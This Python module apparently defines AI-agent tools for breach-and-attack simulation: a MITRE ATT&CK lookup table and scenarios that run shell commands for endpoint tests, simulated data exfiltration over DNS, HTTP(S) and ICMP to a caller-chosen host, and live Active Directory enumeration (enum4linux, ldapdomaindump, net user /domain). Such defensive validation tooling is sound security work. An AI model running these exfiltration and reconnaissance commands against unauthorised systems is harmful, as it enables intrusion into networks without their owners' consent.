"""BAS (Breach & Attack Simulation) scenario tools.

Provides structured BAS scenarios for endpoint security validation,
data exfiltration testing, Active Directory reconnaissance, and
MITRE ATT&CK technique mapping.
"""

import json

from kryon.sdk.agents import function_tool
from kryon.tools.common import run_command

# ---------------------------------------------------------------------------
# Helper — wraps run_command so tests can mock at a single point
# ---------------------------------------------------------------------------


def _run_cmd(cmd: str, ctf=None) -> str:
    """Execute a shell command via the common dispatcher."""
    return run_command(cmd, ctf=ctf)


# ---------------------------------------------------------------------------
# MITRE ATT&CK technique database (30 common techniques)
# ---------------------------------------------------------------------------

_MITRE_TECHNIQUES: dict[str, dict] = {
    "T1059": {
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.",
        "detection": "Monitor process and command-line activity for unusual scripting interpreter usage. Log PowerShell, bash, Python, and other interpreter executions.",
    },
    "T1078": {
        "name": "Valid Accounts",
        "tactic": "Defense Evasion, Persistence, Privilege Escalation, Initial Access",
        "description": "Adversaries may obtain and abuse credentials of existing accounts to gain Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
        "detection": "Monitor authentication logs for anomalous logins (unusual times, locations, concurrent sessions). Implement MFA and conditional access policies.",
    },
    "T1110": {
        "name": "Brute Force",
        "tactic": "Credential Access",
        "description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.",
        "detection": "Monitor authentication logs for repeated failed login attempts. Implement account lockout policies and monitor for password spraying patterns.",
    },
    "T1003": {
        "name": "OS Credential Dumping",
        "tactic": "Credential Access",
        "description": "Adversaries may attempt to dump credentials to obtain account login and credential material from OS memory (LSASS, SAM, NTDS.dit).",
        "detection": "Monitor for access to LSASS process memory, SAM registry hive, and NTDS.dit file. Detect tools like Mimikatz, secretsdump, and procdump.",
    },
    "T1021": {
        "name": "Remote Services",
        "tactic": "Lateral Movement",
        "description": "Adversaries may use valid accounts to log into remote services (RDP, SSH, SMB, WinRM) for lateral movement.",
        "detection": "Monitor for unusual remote service connections, especially from non-admin workstations. Correlate with authentication events.",
    },
    "T1055": {
        "name": "Process Injection",
        "tactic": "Defense Evasion, Privilege Escalation",
        "description": "Adversaries may inject code into processes to evade process-based defenses and elevate privileges.",
        "detection": "Monitor for API calls associated with process injection (WriteProcessMemory, CreateRemoteThread, NtQueueApcThread). Use Sysmon Event ID 8.",
    },
    "T1053": {
        "name": "Scheduled Task/Job",
        "tactic": "Execution, Persistence, Privilege Escalation",
        "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.",
        "detection": "Monitor scheduled task creation via schtasks, at, cron. Alert on tasks created by non-admin users or with suspicious command lines.",
    },
    "T1027": {
        "name": "Obfuscated Files or Information",
        "tactic": "Defense Evasion",
        "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents.",
        "detection": "Analyze files for high entropy, unusual encoding, or packed executables. Monitor for base64-encoded PowerShell commands.",
    },
    "T1071": {
        "name": "Application Layer Protocol",
        "tactic": "Command and Control",
        "description": "Adversaries may communicate using application layer protocols (HTTP, HTTPS, DNS, SMTP) to avoid detection.",
        "detection": "Monitor network traffic for anomalous patterns in standard protocols. Inspect DNS for unusually long queries or high query volumes.",
    },
    "T1105": {
        "name": "Ingress Tool Transfer",
        "tactic": "Command and Control",
        "description": "Adversaries may transfer tools or files from an external system into a compromised environment.",
        "detection": "Monitor for file downloads via certutil, bitsadmin, curl, wget, PowerShell. Inspect network traffic for unusual file transfers.",
    },
    "T1547": {
        "name": "Boot or Logon Autostart Execution",
        "tactic": "Persistence, Privilege Escalation",
        "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon.",
        "detection": "Monitor Run/RunOnce registry keys, startup folders, and systemd/launchd configurations for unauthorized additions.",
    },
    "T1548": {
        "name": "Abuse Elevation Control Mechanism",
        "tactic": "Privilege Escalation, Defense Evasion",
        "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions (UAC bypass, sudo abuse).",
        "detection": "Monitor for UAC bypass attempts, unexpected sudo usage, and setuid/setgid binary modifications.",
    },
    "T1558": {
        "name": "Steal or Forge Kerberos Tickets",
        "tactic": "Credential Access",
        "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging tickets (Golden/Silver Ticket, Kerberoasting).",
        "detection": "Monitor for unusual Kerberos ticket requests (TGS for service accounts), RC4 encryption downgrades, and ticket reuse across hosts.",
    },
    "T1087": {
        "name": "Account Discovery",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to get a listing of accounts on a system or within an environment (local, domain, email, cloud).",
        "detection": "Monitor for commands like net user, net group, ldapsearch, Get-ADUser, and unusual LDAP queries.",
    },
    "T1482": {
        "name": "Domain Trust Discovery",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to gather information on domain trust relationships for lateral movement across trust boundaries.",
        "detection": "Monitor for nltest /domain_trusts, Get-ADTrust, and LDAP queries targeting trustedDomain objects.",
    },
    "T1046": {
        "name": "Network Service Discovery",
        "tactic": "Discovery",
        "description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure.",
        "detection": "Monitor for port scanning activity (nmap, masscan) and unusual network connection attempts to multiple ports.",
    },
    "T1190": {
        "name": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "description": "Adversaries may attempt to exploit vulnerabilities in internet-facing applications to gain initial access.",
        "detection": "Monitor web application logs for exploit patterns, SQL injection, path traversal, and deserialization attacks. Use WAF rules.",
    },
    "T1566": {
        "name": "Phishing",
        "tactic": "Initial Access",
        "description": "Adversaries may send phishing messages to gain access to victim systems via spearphishing attachments, links, or services.",
        "detection": "Implement email filtering, sandbox analysis for attachments, and URL reputation checks. Monitor for macro-enabled documents.",
    },
    "T1486": {
        "name": "Data Encrypted for Impact",
        "tactic": "Impact",
        "description": "Adversaries may encrypt data on target systems or networks to interrupt availability (ransomware).",
        "detection": "Monitor file system for mass file modifications/renames with known ransomware extensions. Detect encryption API usage patterns.",
    },
    "T1070": {
        "name": "Indicator Removal",
        "tactic": "Defense Evasion",
        "description": "Adversaries may delete or modify artifacts generated on a host system to remove evidence of their presence.",
        "detection": "Monitor for event log clearing (wevtutil, Clear-EventLog), file deletion in temp directories, and timestomping.",
    },
    "T1562": {
        "name": "Impair Defenses",
        "tactic": "Defense Evasion",
        "description": "Adversaries may maliciously modify components of a victim environment to hinder or disable defensive mechanisms.",
        "detection": "Monitor for AV/EDR service stops, firewall rule modifications, and security tool process termination.",
    },
    "T1047": {
        "name": "Windows Management Instrumentation",
        "tactic": "Execution",
        "description": "Adversaries may abuse WMI to execute malicious commands and payloads on local and remote systems.",
        "detection": "Monitor for wmic.exe process creation, WMI event subscriptions, and remote WMI connections.",
    },
    "T1569": {
        "name": "System Services",
        "tactic": "Execution",
        "description": "Adversaries may abuse system services or daemons to execute malicious commands or payloads.",
        "detection": "Monitor for sc.exe, service creation/modification events, and unusual service binaries.",
    },
    "T1098": {
        "name": "Account Manipulation",
        "tactic": "Persistence, Privilege Escalation",
        "description": "Adversaries may manipulate accounts to maintain and/or elevate access (add credentials, modify permissions, add to groups).",
        "detection": "Monitor for changes to user accounts, group membership modifications, and SSH authorized_keys file changes.",
    },
    "T1136": {
        "name": "Create Account",
        "tactic": "Persistence",
        "description": "Adversaries may create accounts to maintain access, including local, domain, and cloud accounts.",
        "detection": "Monitor for net user /add, useradd, and cloud IAM account creation events. Alert on accounts created outside change windows.",
    },
    "T1048": {
        "name": "Exfiltration Over Alternative Protocol",
        "tactic": "Exfiltration",
        "description": "Adversaries may steal data by exfiltrating it over a different protocol than the C2 channel (DNS, ICMP, SMTP).",
        "detection": "Monitor for unusual DNS query patterns, ICMP data payloads, and outbound connections on non-standard ports.",
    },
    "T1567": {
        "name": "Exfiltration Over Web Service",
        "tactic": "Exfiltration",
        "description": "Adversaries may use legitimate external web services to exfiltrate data (cloud storage, paste sites, code repos).",
        "detection": "Monitor for large uploads to cloud storage services, paste sites, and file sharing platforms outside normal business patterns.",
    },
    "T1560": {
        "name": "Archive Collected Data",
        "tactic": "Collection",
        "description": "Adversaries may compress and/or encrypt collected data prior to exfiltration using utilities like zip, tar, 7z, or rar.",
        "detection": "Monitor for archive utility execution (zip, 7z, tar, rar) especially when targeting sensitive directories.",
    },
    "T1218": {
        "name": "System Binary Proxy Execution",
        "tactic": "Defense Evasion",
        "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution through trusted system binaries (LOLBins).",
        "detection": "Monitor for suspicious use of mshta, regsvr32, rundll32, certutil, and other LOLBins with unusual arguments.",
    },
    "T1543": {
        "name": "Create or Modify System Process",
        "tactic": "Persistence, Privilege Escalation",
        "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads.",
        "detection": "Monitor for new service installations, systemd unit file creation, and launchd plist modifications.",
    },
}

# ---------------------------------------------------------------------------
# BAS Scenario 1 — Endpoint Security
# ---------------------------------------------------------------------------

_ENDPOINT_TESTS = [
    {
        "name": "eicar_download",
        "description": "Download EICAR test file to verify AV detection",
        "cmd": "curl -s -o /tmp/eicar.com 'https://secure.eicar.org/eicar.com' 2>&1 && cat /tmp/eicar.com 2>/dev/null; rm -f /tmp/eicar.com",
    },
    {
        "name": "encoded_powershell",
        "description": "Execute base64-encoded PowerShell command (whoami)",
        "cmd": "echo 'Test: PowerShell -EncodedCommand simulation' && echo 'd2hvYW1p' | base64 -d 2>/dev/null || echo 'base64 test'",
    },
    {
        "name": "obfuscated_script",
        "description": "Attempt to run obfuscated script content",
        "cmd": "echo 'Test: Invoke-Obfuscation simulation - $env:USERNAME'",
    },
    {
        "name": "lolbin_execution",
        "description": "Test LOLBin execution (certutil, mshta, regsvr32)",
        "cmd": "echo 'Test: certutil -urlcache -split -f http://test/payload simulation'",
    },
    {
        "name": "process_hollowing",
        "description": "Simulate process hollowing detection test",
        "cmd": "echo 'Test: CreateProcess(SUSPENDED) + WriteProcessMemory simulation'",
    },
]


@function_tool(strict_mode=False)
def bas_endpoint_security(
    target_host: str,
    agent_path: str = "",
    ctf=None,
) -> str:
    """
    BAS Scenario: Test endpoint security (AV/EDR) detection capabilities.

    Downloads EICAR test file, attempts obfuscated script execution,
    tests LOLBin usage, and simulates process injection to evaluate
    how well endpoint security controls detect and block threats.

    Args:
        target_host: Target host IP or hostname to test
        agent_path: Optional path to a BAS agent on the target
        ctf: CTF context for execution

    Returns:
        str: JSON with scenario results {scenario, tests_run, detected, bypassed, score, details}
    """
    tests_run = 0
    detected = 0
    bypassed = 0
    details = []

    for test in _ENDPOINT_TESTS:
        tests_run += 1
        cmd = test["cmd"]
        if agent_path:
            cmd = f"{agent_path} --exec '{cmd}'"

        output = _run_cmd(cmd, ctf=ctf)

        # Heuristic: check if the output suggests detection/blocking
        output_lower = output.lower() if output else ""
        was_detected = any(
            kw in output_lower
            for kw in [
                "detected",
                "blocked",
                "quarantine",
                "denied",
                "threat",
                "malware",
                "prevented",
                "access denied",
            ]
        )

        if was_detected:
            detected += 1
            status = "DETECTED"
        else:
            bypassed += 1
            status = "BYPASSED"

        details.append(
            {
                "test": test["name"],
                "description": test["description"],
                "status": status,
                "output_snippet": (output or "")[:200],
            }
        )

    # Score: percentage of tests that were detected (higher = better security)
    score = round((detected / tests_run * 100) if tests_run > 0 else 0, 1)

    return json.dumps(
        {
            "scenario": "endpoint_security",
            "target_host": target_host,
            "tests_run": tests_run,
            "detected": detected,
            "bypassed": bypassed,
            "score": score,
            "details": details,
        },
        indent=2,
    )


# ---------------------------------------------------------------------------
# BAS Scenario 2 — Data Exfiltration
# ---------------------------------------------------------------------------

_EXFIL_PROTOCOLS: dict[str, dict] = {
    "dns": {
        "description": "DNS tunneling exfiltration (dnscat2 simulation)",
        "cmd": "nslookup {encoded}.exfil-test.{target} 2>&1 || echo 'DNS exfiltration test completed'",
    },
    "https": {
        "description": "HTTPS data exfiltration via encoded POST",
        "cmd": "curl -s -X POST -d 'data=EXFIL_TEST_PAYLOAD_BASE64' https://{target}/upload 2>&1 || echo 'HTTPS exfiltration test completed'",
    },
    "http": {
        "description": "HTTP data exfiltration via encoded GET parameters",
        "cmd": "curl -s 'http://{target}/search?q=EXFIL_TEST_DATA_ENCODED' 2>&1 || echo 'HTTP exfiltration test completed'",
    },
    "icmp": {
        "description": "ICMP data exfiltration via ping payload",
        "cmd": "ping -c 1 -p 455846494c5f54455354 {target} 2>&1 || echo 'ICMP exfiltration test completed'",
    },
    "smtp": {
        "description": "SMTP exfiltration via email (simulation only)",
        "cmd": "echo 'Test: SMTP exfiltration to {target} - simulated'",
    },
}


@function_tool(strict_mode=False)
def bas_data_exfiltration(
    target_host: str,
    protocol: str = "https",
    ctf=None,
) -> str:
    """
    BAS Scenario: Test data exfiltration detection via various protocols.

    Simulates data exfiltration attempts via DNS tunneling, HTTP(S),
    ICMP, and SMTP to test if DLP and network security controls can
    detect and block outbound data theft.

    Args:
        target_host: Target host or exfiltration destination
        protocol: Protocol to test (dns, https, http, icmp, smtp, all)
        ctf: CTF context for execution

    Returns:
        str: JSON with scenario results {scenario, protocols_tested, blocked, allowed, details}
    """
    protocols_to_test = list(_EXFIL_PROTOCOLS.keys()) if protocol == "all" else [protocol]

    blocked = 0
    allowed = 0
    details = []

    for proto in protocols_to_test:
        proto_info = _EXFIL_PROTOCOLS.get(proto)
        if not proto_info:
            details.append(
                {
                    "protocol": proto,
                    "status": "ERROR",
                    "output": f"Unknown protocol: {proto}. Available: {', '.join(_EXFIL_PROTOCOLS.keys())}",
                }
            )
            continue

        cmd = proto_info["cmd"].format(target=target_host, encoded="EXFIL5445535444415441")
        output = _run_cmd(cmd, ctf=ctf)

        output_lower = output.lower() if output else ""
        was_blocked = any(
            kw in output_lower
            for kw in [
                "blocked",
                "denied",
                "refused",
                "filtered",
                "dropped",
                "prevented",
                "policy",
                "dlp",
            ]
        )

        if was_blocked:
            blocked += 1
            status = "BLOCKED"
        else:
            allowed += 1
            status = "ALLOWED"

        details.append(
            {
                "protocol": proto,
                "description": proto_info["description"],
                "status": status,
                "output_snippet": (output or "")[:200],
            }
        )

    return json.dumps(
        {
            "scenario": "data_exfiltration",
            "target_host": target_host,
            "protocols_tested": len(protocols_to_test),
            "blocked": blocked,
            "allowed": allowed,
            "details": details,
        },
        indent=2,
    )


# ---------------------------------------------------------------------------
# BAS Scenario 3 — Active Directory Reconnaissance
# ---------------------------------------------------------------------------

_AD_TECHNIQUES = [
    {
        "name": "enum4linux",
        "description": "SMB/NetBIOS enumeration via enum4linux",
        "cmd": "enum4linux -a {dc} 2>&1 | head -100 || echo 'enum4linux not available'",
    },
    {
        "name": "ldap_dump",
        "description": "LDAP domain dump via ldapdomaindump",
        "cmd": "ldapdomaindump {dc} 2>&1 | head -50 || echo 'ldapdomaindump not available'",
    },
    {
        "name": "net_user_domain",
        "description": "Enumerate domain users via net user /domain",
        "cmd": "net user /domain 2>&1 || echo 'net user /domain not available'",
    },
    {
        "name": "net_group_domain",
        "description": "Enumerate domain groups via net group /domain",
        "cmd": "net group /domain 2>&1 || echo 'net group /domain not available'",
    },
    {
        "name": "bloodhound_collection",
        "description": "BloodHound data collection simulation",
        "cmd": "echo 'Test: SharpHound.exe -c All -d {domain} simulation'",
    },
    {
        "name": "kerberoast",
        "description": "Kerberoasting — request service tickets for cracking",
        "cmd": "echo 'Test: GetUserSPNs.py {domain}/ -request simulation'",
    },
]


@function_tool(strict_mode=False)
def bas_ad_reconnaissance(
    domain_controller: str,
    domain: str = "",
    ctf=None,
) -> str:
    """
    BAS Scenario: Test Active Directory reconnaissance detection.

    Runs AD enumeration techniques (enum4linux, ldapdomaindump,
    net user/group, BloodHound, Kerberoasting) to evaluate whether
    security monitoring detects the reconnaissance activity.

    Args:
        domain_controller: Target domain controller IP or hostname
        domain: Domain name (e.g. corp.example.com)
        ctf: CTF context for execution

    Returns:
        str: JSON with scenario results {scenario, techniques_used, data_gathered, detection_status, details}
    """
    techniques_used = 0
    data_gathered = 0
    detected = 0
    details = []

    effective_domain = domain or "UNKNOWN"

    for technique in _AD_TECHNIQUES:
        techniques_used += 1
        cmd = technique["cmd"].format(dc=domain_controller, domain=effective_domain)
        output = _run_cmd(cmd, ctf=ctf)

        output_lower = output.lower() if output else ""

        # Check if any meaningful data was gathered
        has_data = any(
            kw in output_lower
            for kw in [
                "user",
                "group",
                "admin",
                "domain",
                "account",
                "member",
                "share",
                "spn",
                "dn:",
                "cn=",
            ]
        )

        # Check if the activity was detected
        was_detected = any(
            kw in output_lower
            for kw in [
                "detected",
                "blocked",
                "alert",
                "denied",
                "honeypot",
                "forbidden",
            ]
        )

        if has_data:
            data_gathered += 1

        if was_detected:
            detected += 1

        status = "DETECTED" if was_detected else ("DATA_GATHERED" if has_data else "NO_DATA")

        details.append(
            {
                "technique": technique["name"],
                "description": technique["description"],
                "status": status,
                "output_snippet": (output or "")[:200],
            }
        )

    detection_status = (
        "FULLY_DETECTED" if detected == techniques_used else "PARTIALLY_DETECTED" if detected > 0 else "UNDETECTED"
    )

    return json.dumps(
        {
            "scenario": "ad_reconnaissance",
            "domain_controller": domain_controller,
            "domain": effective_domain,
            "techniques_used": techniques_used,
            "data_gathered": data_gathered,
            "detection_status": detection_status,
            "details": details,
        },
        indent=2,
    )


# ---------------------------------------------------------------------------
# MITRE ATT&CK Mapping Tool
# ---------------------------------------------------------------------------


@function_tool(strict_mode=False)
def mitre_attack_mapping(
    technique_ids: str,
    ctf=None,
) -> str:
    """
    Map MITRE ATT&CK technique IDs to full technique information.

    Takes comma-separated technique IDs and returns detailed information
    including technique name, tactic, description, and detection
    recommendations from a built-in ATT&CK knowledge base.

    Args:
        technique_ids: Comma-separated MITRE ATT&CK technique IDs (e.g. "T1059,T1078,T1110")
        ctf: CTF context

    Returns:
        str: JSON with technique details {techniques: [{id, name, tactic, description, detection}]}
    """
    ids = [tid.strip() for tid in technique_ids.split(",") if tid.strip()]
    techniques = []
    unknown = []

    for tid in ids:
        info = _MITRE_TECHNIQUES.get(tid)
        if info:
            techniques.append(
                {
                    "id": tid,
                    "name": info["name"],
                    "tactic": info["tactic"],
                    "description": info["description"],
                    "detection": info["detection"],
                }
            )
        else:
            unknown.append(tid)

    result: dict = {"techniques": techniques}
    if unknown:
        result["unknown_ids"] = unknown
        result["available_ids"] = sorted(_MITRE_TECHNIQUES.keys())

    return json.dumps(result, indent=2)
